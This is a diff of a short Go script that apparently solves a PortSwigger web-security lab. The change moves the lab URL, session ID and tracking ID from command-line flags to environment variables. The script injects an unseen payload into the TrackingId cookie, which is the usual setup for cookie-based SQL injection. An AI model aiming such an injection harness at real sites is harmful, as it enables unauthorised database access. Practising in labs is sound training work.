@@ -1,29 +1,24 @@
 package main
 
 import (
-	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
-
+	"os"
 	"strings"
+
+	_ "github.com/joho/godotenv/autoload"
 )
 
 func main() {
-	urlInput := flag.String("url", "", "Lab url")
-	sessionInput := flag.String("session", "", "Lab sesion")
-	trackingIdInput := flag.String("tracking-id", "", "Lab TrackingId")
-
-	flag.Parse()
-
-	myUrl := *urlInput
-	mySession := *sessionInput
-	myTrackingId := *trackingIdInput
+	myUrl := os.Getenv("PORTSWIGGER_LAB_URL")
+	mySessionId := os.Getenv("SESSION_ID")
+	myTrackingId := os.Getenv("TRACKING_ID")
 
 	fmt.Println("Haxxing...")
 	fmt.Println("url::: " + myUrl)
-	fmt.Println("session::: " + mySession)
+	fmt.Println("sessionId::: " + mySessionId)
 	fmt.Println("trackingId::: " + myTrackingId)
 	fmt.Println("-------------------")
 
@@ -34,7 +29,7 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
-	cookiez := "TrackingId=" + myTrackingId + payload + ";session=" + mySession
+	cookiez := "TrackingId=" + myTrackingId + payload + ";session=" + mySessionId
 	req.Header.Set("Cookie", cookiez)
 
 	respz, err := client.Do(req)
